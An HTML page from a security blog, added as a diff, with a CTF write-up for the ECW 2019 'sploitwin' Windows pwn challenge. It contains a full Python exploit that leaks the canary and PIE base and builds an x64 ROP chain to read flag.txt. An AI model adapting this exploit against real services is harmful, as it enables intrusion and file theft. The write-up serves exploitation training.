@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> Write Up : ECW 2019 - sploitwin &middot; 0xUKN - (in)Security Blog </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.69.2" />
+
+
+<script src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://0xukn.fr/css/nix.css">
+
+
+
+<link rel="shortcut icon" href="/favicon.jpg">
+
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata%7COpen+Sans%7CConcert+One" rel="stylesheet">
+
+
+
+
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" id="green-terminal" href=https://0xukn.fr>0xUKN@localhost ~ $</a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				
+				
+				<li class="dropdown">
+                    
+            		<a id="green-terminal" href="/">about</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a id="green-terminal" href="/posts">posts</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a id="green-terminal" href="/projects">projects</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a id="green-terminal" href="/tags">tags</a>
+            		
+        		</li>
+        		
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="container wrapper">
+            <h1><a href="https://0xukn.fr/posts/writeupecw2019sploitwin/">Write Up : ECW 2019 - sploitwin</a></h1>
+	
+		<br><br>
+		<div id="tags">
+			<h4 style="display:inline">Tags :</h4>
+			
+				
+				<a href="/tags/pwn">pwn</a>
+			
+				 - 
+				<a href="/tags/windows-exploitation">Windows exploitation</a>
+			
+				 - 
+				<a href="/tags/stack-overflow">stack overflow</a>
+			
+		</div>
+	
+            <span class="post-date">2019-11-21 </span>
+            <div class="post-content">
+                <p><em><strong>This post spoils a CTF challenge &hellip; Don&rsquo;t read if you want to try it !</strong></em></p>
+<p>ECW (European Cyber Week) is a Jeopardy student CTF challenge. It is organized by Thales, Airbus and the Bretagne region. I had a great time solving these challenges, especially reverse and pwn ones. Hurry to hand over this !</p>
+<h2 id="-presentation"><em>[+]</em> Presentation</h2>
+<p>Your mission Jim, if you accept it, is to enter the service exposed on the port 741 and extract the secret file &ldquo;flag.txt&rdquo;. Many safeguards are in place to prevent intrusions and you will have to sneak through very strict network filtering.</p>
+<p>As always, if you or any of your exploits are taken by crashing the service, the secretary will deny any knowledge of your actions. Good luck!</p>
+<p>tcp://challenge-ecw.fr:741</p>
+<h2 id="-recon"><em>[+]</em> Recon</h2>
+<p>File output :
+<figure style="text-align: center;" >
+    
+        <img src="/resources/ecw2019_sploitwin/file.png"  />
+    
+    
+</figure>
+</p>
+<p>When connecting to the remote service, we are welcomed by &hellip; nothing ?
+<figure style="text-align: center;" >
+    
+        <img src="/resources/ecw2019_sploitwin/recon.png"  />
+    
+    
+</figure>
+</p>
+<p>The service is not really verbose, we will need to reverse it to have a better understanding of it.</p>
+<h2 id="-reversing"><em>[+]</em> Reversing</h2>
+<p>By searching references to WinAPI functions such as CreateThread, we can find an interesting function which seems to be a main : it waits for incoming connections, and executes a function for each opened socket.
+<figure style="text-align: center;" >
+    
+        <img src="/resources/ecw2019_sploitwin/main.png"  />
+    
+    
+</figure>
+</p>
+<figure style="text-align: center;" >
+    
+        <img src="/resources/ecw2019_sploitwin/main2.png"  />
+    
+    
+</figure>
+
+<p>It appears that the called function is an implementation for a custom protocol which mostly interacts with buffers.</p>
+<p>The protocol is basically constituted from 2 parts : an opcode, and some arguments. The opcode is the first byte, and the arguments are the following bytes in big endian format.</p>
+<p>The protocol have 5 functions, which are specified by the opcode sent by the client :</p>
+<ul>
+<li>OPCODE 1 =&gt; WRITE_BUFFER_1 =&gt; Hard to understand, write n bytes from input in a stack buffer with n specified by the first argument (4 bytes in big endian) and input specified by the second argument.</li>
+<li>OPCODE 2 =&gt; WRITE_BUFFER_2 =&gt; Hard to understand, write n bytes from input in a stack buffer with n specified by the first argument (4 bytes in big endian) and input specified by the second argument.</li>
+<li>OPCODE 3 =&gt; WRITE_BUFFER_3 =&gt; Write n bytes from input in a heap buffer with n specified by the first argument (4 bytes in big endian) and input specified by the second argument.</li>
+<li>OPCODE 4 =&gt; READ_BUFFER =&gt; Read 4 bytes from the stack at the offset specified by the first argument (4 bytes in big endian).</li>
+<li>OPCODE 0 and 5 =&gt; EXIT.</li>
+<li>Others OPCODEs don&rsquo;t do anything.</li>
+</ul>
+<figure style="text-align: center;" >
+    
+        <img src="/resources/ecw2019_sploitwin/protocol.png"  />
+    
+    
+</figure>
+
+<p>After fuzzing/reversing those functions, I found 2 vulnerabilities :</p>
+<ul>
+<li>READ_BUFFER can read arbitrary stack data since the offset given in argument is not verified.</li>
+<li>WRITE_BUFFER_1 is vulnerable to a simple stack based buffer overflow : the data length is not verified, so we can overflow the stack with user controlled inputs.</li>
+</ul>
+<p>I had no real experience in Windows exploitation so I took a step back to read about the different existing memory protections in Windows and their differences from Linux (Geluchat&rsquo;s <a href="https://www.dailysecurity.fr/windows_exploit_64_bits_rop/">article</a> is a goldmine for French beginners):</p>
+<ul>
+<li>DEP is the equivalent of Linux&rsquo;s NX.</li>
+<li>ASLR works like the ASLR + PIE on Linux <em>BUT</em> the offsets for the libraries are the same at each execution, they only change after a reboot.</li>
+<li>GS is the equivalent of Linux&rsquo;s stack canary.</li>
+</ul>
+<p>These are the only protections activated on the binary, CFG is not a problem here.
+<figure style="text-align: center;" >
+    
+        <img src="/resources/ecw2019_sploitwin/protections.png"  />
+    
+    
+</figure>
+</p>
+<p>The exploitation is not far from a classic Linux leak and ROP. The only difficulty is that the binary&rsquo;s network is stricly filtered so we can&rsquo;t create another socket to send data or a remote shell : we will need to reuse the existing socket for our exploitation.</p>
+<p>The main difference with a Linux x64 ROP is that Windows uses different registers for functions arguments and the 40 top bytes of the called function&rsquo;s stack (<em>called shadow space</em>), so we need to keep theses bytes clear in our ROP chain.</p>
+<p>I used <a href="https://github.com/masthoon/pwintools">pwintools</a> to debug my exploit locally on Windows and <a href="https://github.com/0vercl0k/rp">rp++</a> to find gadgets in the binary.</p>
+<p>We will first use the read primitive to get PIE offset, stack canary and socket handle number, we will then build our ROP on the stack with the write primitive and finally call the exit functions to trigger the ROP chain.</p>
+<p>And here is the final exploit <a href="/resources/ecw2019_sploitwin/solve_flag.py"><code>solve_flag.py</code></a>:</p>
+<pre><code>#!/usr/bin/python
+from struct import pack, unpack
+from pwn import remote
+from sys import argv
+#from pwintools import Remote as remote #for Windows debugging
+
+p = remote(&quot;challenge-ecw.fr&quot;, 741)
+#p = remote(&quot;localhost&quot;, 1337)
+
+WRITE_OPCODE = &quot;\x01&quot;
+LEAK_OPCODE = &quot;\x04&quot;
+RETURN_OPCODE = &quot;\x05&quot;
+
+PIE_BASE_OFFSET_FROM_LEAK = 0x2507
+LEAK_PIE_OFFSET = 0x106
+OFFSET_PIE_JMP_CreateFile = 0x6615
+OFFSET_PIE_JMP_ReadFile = 0x662d
+OFFSET_PIE_JMP_Send = 0x13FB965E5 - 0x13FB90000 #address - base
+OFFSET_PIE_POP_RCX = 0x13603
+OFFSET_PIE_POP_RDX = 0x1b4be
+OFFSET_PIE_POP_RAX = 0x3a6e
+OFFSET_PIE_POP_R8 = 0x3a6d
+OFFSET_PIE_MOV_R9 = 0x47777 #mess up rax, rcx, rdx, r8 =&gt; TO USE PUT 0 IN RCX AND TARGET VALUE IN R8
+OFFSET_PIE_CALL_RAX = 0x69df6
+OFFSET_PIE_MOV_RCX_QWORD_RCX = 0x20f6b #burn rax
+OFFSET_PIE_MOV_QWORD_RCX_RAX = 0x3ddc3 #burn rax
+OFFSET_ADDRESS_RW1 = 0x9d010
+OFFSET_ADDRESS_TMP = 0x9d020
+OFFSET_ADDRESS_RW2 = 0x9d040
+OFFSET_ADDRESS_RW3 = 0x9d070
+OFFSET_PIE_TRI_POP = 0x6aeb1
+OFFSET_PIE_BI_POP = 0x6aeb3
+OFFSET_PIE_FIVE_POP = 0x20206
+OFFSET_PIE_SEVEN_POP = 0x20202
+
+LEAK_CANARY_OFFSET = 0x100
+LEAK_SOCKET_OFFSET = 0x104
+
+WRITE_ROP_PADDING = &quot;a&quot; * 0x400
+#We can use a payload like to write &quot;\x01\x00\x00\x00&lt;len(padding+payload)/8&gt;&lt;PADDING+PAYLOAD&gt;&quot;
+
+#Leak PIE part1
+p.sendline(LEAK_OPCODE + pack(&quot;&gt;i&quot;, LEAK_PIE_OFFSET))
+PIE_LEAK = p.recv(4)
+
+#Leak PIE part2
+p.sendline(LEAK_OPCODE + pack(&quot;&gt;i&quot;, LEAK_PIE_OFFSET + 1))
+PIE_LEAK += p.recv(4)
+
+PIE_LEAK = unpack(&quot;&lt;Q&quot;, PIE_LEAK)[0]
+BASE_PIE = PIE_LEAK - PIE_BASE_OFFSET_FROM_LEAK
+print(&quot;[+] Leak PIE : 0x%x&quot; % PIE_LEAK)
+print(&quot;[+] Base PIE : 0x%x&quot; % BASE_PIE)
+
+###########################################################################################
+
+#Leak CANARY part1
+p.sendline(LEAK_OPCODE + pack(&quot;&gt;i&quot;, LEAK_CANARY_OFFSET))
+CANARY_LEAK = p.recv(4)
+
+#Leak CANARY part2
+p.sendline(LEAK_OPCODE + pack(&quot;&gt;i&quot;, LEAK_CANARY_OFFSET + 1))
+CANARY_LEAK += p.recv(4)
+
+CANARY_LEAK = unpack(&quot;&lt;Q&quot;, CANARY_LEAK)[0]
+print(&quot;[+] Leak CANARY : 0x%x&quot; % CANARY_LEAK)
+
+############################################################################################
+
+#Leak Socket Handle
+p.sendline(LEAK_OPCODE + pack(&quot;&gt;i&quot;, LEAK_SOCKET_OFFSET))
+SOCKET_LEAK = p.recv(4) + &quot;\x00&quot; * 4
+
+SOCKET_LEAK = unpack(&quot;&lt;Q&quot;, SOCKET_LEAK)[0]
+print(&quot;[+] Leak SOCKET HANDLE : 0x%x&quot; % SOCKET_LEAK)
+
+############################################################################################
+
+payload = WRITE_ROP_PADDING
+payload += pack(&quot;&lt;Q&quot;, CANARY_LEAK)
+
+payload += pack(&quot;&lt;Q&quot;, 0)
+payload += pack(&quot;&lt;Q&quot;, 0) #padding
+
+#Write &quot;flag.txt&quot; in memory
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_POP_RAX)
+payload += &quot;flag.txt&quot;.ljust(8, '\x00')
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_POP_RCX)
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_ADDRESS_RW1)
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_MOV_QWORD_RCX_RAX)
+
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_POP_RAX)
+payload += &quot;&quot;.ljust(8, '\x00')
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_POP_RCX)
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_ADDRESS_RW1 + 8)
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_MOV_QWORD_RCX_RAX) #flag.txt ecrit @adresse1
+
+#Prepare the CreateFile part of the ROP
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_POP_RCX)
+payload += pack(&quot;&lt;Q&quot;, 0)
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_POP_R8)
+payload += pack(&quot;&lt;Q&quot;, 0)
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_MOV_R9) #lp security attribute = null
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_POP_RCX)
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_ADDRESS_RW1) #filename
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_POP_RDX)
+payload += pack(&quot;&lt;Q&quot;, 0x80000000) #desired access mode = GENERIC_READ
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_POP_R8)
+payload += pack(&quot;&lt;Q&quot;, 0) #share mode = null
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_JMP_CreateFile)
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_SEVEN_POP)
+payload += pack(&quot;&lt;Q&quot;, 0) #shadow space
+payload += pack(&quot;&lt;Q&quot;, 0) #shadow space
+payload += pack(&quot;&lt;Q&quot;, 0) #shadow space
+payload += pack(&quot;&lt;Q&quot;, 0) #shadow space
+payload += pack(&quot;&lt;Q&quot;, 3) #create = 3
+payload += pack(&quot;&lt;Q&quot;, 0x80) #file_attribute = normal
+payload += pack(&quot;&lt;Q&quot;, 0) #template_file = null
+#CreateFile OK
+
+#Save CreateFile's created handle in a tmp memory
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_POP_RCX)
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_ADDRESS_TMP)
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_MOV_QWORD_RCX_RAX) #handle in TMP
+
+#Prepare the ReadFile part of the ROP
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_POP_RCX)
+payload += pack(&quot;&lt;Q&quot;, 0)
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_POP_R8)
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_ADDRESS_RW2)
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_MOV_R9) #lpNumberOfBytesRead
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_POP_RCX)
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_ADDRESS_TMP) #file handle loc
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_MOV_RCX_QWORD_RCX) #file handle
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_POP_RDX)
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_ADDRESS_RW3) #buffer
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_POP_R8)
+payload += pack(&quot;&lt;Q&quot;, 100) #numb of bytes to read
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_JMP_ReadFile)
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_FIVE_POP)
+payload += pack(&quot;&lt;Q&quot;, 0) #shadow space
+payload += pack(&quot;&lt;Q&quot;, 0) #shadow space
+payload += pack(&quot;&lt;Q&quot;, 0) #shadow space
+payload += pack(&quot;&lt;Q&quot;, 0) #shadow space
+payload += pack(&quot;&lt;Q&quot;, 0) #overlapped
+#ReadFile OK
+
+#Prepare the Send part of the ROP
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_POP_RCX)
+payload += pack(&quot;&lt;Q&quot;, 0)
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_POP_R8)
+payload += pack(&quot;&lt;Q&quot;, 0)
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_MOV_R9) #flags
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_POP_RCX)
+payload += pack(&quot;&lt;Q&quot;, SOCKET_LEAK) #socket
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_POP_RDX)
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_ADDRESS_RW3) #buffer
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_POP_R8)
+payload += pack(&quot;&lt;Q&quot;, 100) #len
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_JMP_Send)
+payload += pack(&quot;&lt;Q&quot;, BASE_PIE + OFFSET_PIE_FIVE_POP)
+payload += pack(&quot;&lt;Q&quot;, 0) #shadow space
+payload += pack(&quot;&lt;Q&quot;, 0) #shadow space
+payload += pack(&quot;&lt;Q&quot;, 0) #shadow space
+payload += pack(&quot;&lt;Q&quot;, 0) #shadow space
+payload += pack(&quot;&lt;Q&quot;, 0) #overlapped
+#Send OK
+
+
+#############################################################################################
+#Verify payload first
+if len(payload)/8 &gt; 0xff:
+	print(&quot;[!] Payload too long... Exiting (length = %d)&quot; % (len(payload)/8))
+	exit(1)
+
+if '\n' in payload:
+	print(&quot;[!] Payload contains \\n... Exiting&quot;)
+	exit(1)
+
+#Send final payload (payload max size = 0xff * 8)
+p.send(WRITE_OPCODE + pack(&quot;&gt;i&quot;, len(payload)/8) + payload)
+print(&quot;[+] Payload sent...&quot;)
+
+#Trigger buffer overflow
+p.send(RETURN_OPCODE)
+print(&quot;[+] FLAG : %s&quot; % p.recv(69))
+p.close()
+exit(0)
+</code></pre><p>The flag is our&rsquo;s !</p>
+<h2 id="-bye"><em>[+]</em> Bye</h2>
+<p><strong>Feel free to tell me what you think about this post :)</strong></p>
+
+            </div>
+            
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>2020 - 0xUKN -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and based on
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+</footer>
+
+    </body>
